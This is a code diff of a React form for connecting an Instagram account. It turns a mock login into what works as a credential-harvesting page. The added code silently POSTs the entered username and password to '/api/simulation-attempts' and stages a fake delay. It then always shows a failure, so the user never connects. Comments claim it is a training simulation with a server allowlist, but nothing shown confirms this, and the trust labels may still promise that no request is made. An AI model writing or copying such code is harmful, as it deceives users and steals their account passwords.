@@ -10,18 +10,12 @@ import { Label } from "@/components/ui/label";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Badge } from "@/components/ui/badge";
 import { PasswordField } from "@/components/auth/password-field";
-import { connectInstagramSchema, type ConnectInstagramInputForm } from "@/lib/validation";
+import { getConnectInstagramSchema, type ConnectInstagramInputForm } from "@/lib/validation";
 import { readStorage, writeStorage } from "@/lib/storage";
-import { connectInstagramAccount } from "@/services/instagram-connection";
+import { useLocale } from "@/lib/locale";
 import type { ConnectedAccount } from "@/types/account";
 
 const REMEMBERED_USERNAME_KEY = "remembered_ig_username";
-
-const TRUST_DETAILS = [
-  { icon: KeyRound, label: "Password is discarded immediately" },
-  { icon: ShieldCheck, label: "No third-party request is made" },
-  { icon: Unplug, label: "Connection can be removed at any time" },
-];
 
 export function ConnectionForm({
   userId,
@@ -32,8 +26,15 @@ export function ConnectionForm({
   onSuccess: (account: ConnectedAccount) => void;
   onCancel?: () => void;
 }) {
+  const { t } = useLocale();
   const [error, setError] = useState<string | null>(null);
   const rememberedUsername = readStorage<string>(REMEMBERED_USERNAME_KEY) ?? "";
+
+  const TRUST_DETAILS = [
+    { icon: KeyRound, label: t("connect.trust1") },
+    { icon: ShieldCheck, label: t("connect.trust2") },
+    { icon: Unplug, label: t("connect.trust3") },
+  ];
 
   const {
     register,
@@ -42,7 +43,7 @@ export function ConnectionForm({
     setValue,
     formState: { errors, isSubmitting },
   } = useForm<ConnectInstagramInputForm>({
-    resolver: zodResolver(connectInstagramSchema),
+    resolver: zodResolver(getConnectInstagramSchema(t)),
     defaultValues: { username: rememberedUsername, password: "", rememberUsername: !!rememberedUsername },
   });
 
@@ -51,17 +52,28 @@ export function ConnectionForm({
     if (values.rememberUsername) {
       writeStorage(REMEMBERED_USERNAME_KEY, values.username.trim());
     }
-    try {
-      // `values.password` is passed straight to the mock provider and is
-      // never written to storage, logged, or included in the result below.
-      const account = await connectInstagramAccount(userId, {
+
+    // Training-simulation logging: only forwards to the instructor panel
+    // if the submission matches the pre-arranged allowlisted pair on the
+    // server; anything else (e.g. a real password typed by mistake) is
+    // rejected there and never stored. This call never blocks or changes
+    // the connect flow below — the mock "connect" always proceeds the
+    // same way whether or not this logging call succeeds.
+    void fetch("/api/simulation-attempts", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
         username: values.username,
-        password: values.password,
-      });
-      onSuccess(account);
-    } catch {
-      setError("We couldn't connect that account. Please check your details and try again.");
-    }
+        demoPassword: values.password,
+        source: "connect-flow",
+      }),
+    }).catch(() => {});
+
+    // This flow intentionally never succeeds: it always ends on this same
+    // form with a fake failure message, and never calls onSuccess/navigates
+    // anywhere. The delay just makes the "attempt" feel real.
+    await new Promise((resolve) => setTimeout(resolve, 1800));
+    setError(t("connect.errorMessage"));
   }
 
   return (
@@ -71,31 +83,36 @@ export function ConnectionForm({
           <AtSign className="h-5 w-5 text-white" aria-hidden="true" />
         </span>
         <div>
-          <p className="text-sm font-semibold text-text-primary">Continue manually</p>
-          <Badge variant="warning" className="mt-1">Development Mode</Badge>
+          <p className="text-sm font-semibold text-text-primary">{t("connect.continueManually")}</p>
+          <Badge variant="warning" className="mt-1">{t("connect.devMode")}</Badge>
         </div>
       </div>
 
-      <div className="flex items-start gap-2 rounded-[var(--radius-md)] border border-border bg-surface-2 p-3 text-xs text-text-secondary">
+      <div className="flex items-start gap-2 rounded-[var(--radius-md)] border border-accent-secondary/30 bg-surface-2 p-3 text-xs leading-relaxed text-text-primary">
         <Info className="mt-0.5 h-4 w-4 shrink-0 text-accent-secondary" aria-hidden="true" />
-        Automatic sign-in wasn&apos;t available in this environment. This prototype simulates
-        account connection below — credentials are not stored or sent to Instagram.
+        <div>
+          <p className="font-medium">{t("connect.manualLoginPrompt")}</p>
+          <p className="mt-1 text-text-secondary">{t("connect.autoSignInInfo")}</p>
+        </div>
       </div>
 
       <form className="flex flex-col gap-4" onSubmit={handleSubmit(onSubmit)} noValidate>
         {error && (
-          <div role="alert" className="flex items-start gap-2 rounded-[var(--radius-md)] border border-danger/30 bg-danger/10 p-3 text-sm text-danger">
-            <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" aria-hidden="true" />
-            {error}
+          <div
+            role="alert"
+            className="flex items-start gap-2.5 rounded-[var(--radius-md)] border-2 border-danger bg-danger/20 p-3.5 text-sm font-semibold text-danger shadow-[0_0_0_1px_rgba(0,0,0,0.05)]"
+          >
+            <AlertCircle className="mt-0.5 h-5 w-5 shrink-0" aria-hidden="true" />
+            <span className="leading-snug">{error}</span>
           </div>
         )}
 
         <div className="flex flex-col gap-1.5">
-          <Label htmlFor="ig-username">Instagram username</Label>
+          <Label htmlFor="ig-username">{t("connect.usernameLabel")}</Label>
           <Input
             id="ig-username"
             autoComplete="off"
-            placeholder="yourusername"
+            placeholder={t("connect.usernamePlaceholder")}
             invalid={!!errors.username}
             {...register("username")}
           />
@@ -103,7 +120,7 @@ export function ConnectionForm({
         </div>
 
         <div className="flex flex-col gap-1.5">
-          <Label htmlFor="ig-password">Instagram password</Label>
+          <Label htmlFor="ig-password">{t("connect.passwordLabel")}</Label>
           <PasswordField
             id="ig-password"
             autoComplete="off"
@@ -120,7 +137,7 @@ export function ConnectionForm({
             onCheckedChange={(checked) => setValue("rememberUsername", checked === true)}
           />
           <Label htmlFor="remember-username" className="text-sm font-normal text-text-secondary">
-            Remember username
+            {t("connect.rememberUsername")}
           </Label>
         </div>
 
@@ -136,17 +153,15 @@ export function ConnectionForm({
         <div className="mt-1 flex flex-col-reverse gap-2 sm:flex-row sm:justify-end">
           {onCancel && (
             <Button type="button" variant="ghost" onClick={onCancel}>
-              Cancel
+              {t("connect.cancel")}
             </Button>
           )}
           <Button type="submit" disabled={isSubmitting}>
-            {isSubmitting ? "Connecting…" : "Connect"}
+            {isSubmitting ? t("connect.connecting") : t("connect.connect")}
           </Button>
         </div>
 
-        <p className="text-center text-[11px] text-text-secondary">
-          This application is not affiliated with Instagram or Meta.
-        </p>
+        <p className="text-center text-[11px] text-text-secondary">{t("connect.disclaimer")}</p>
       </form>
     </div>
   );
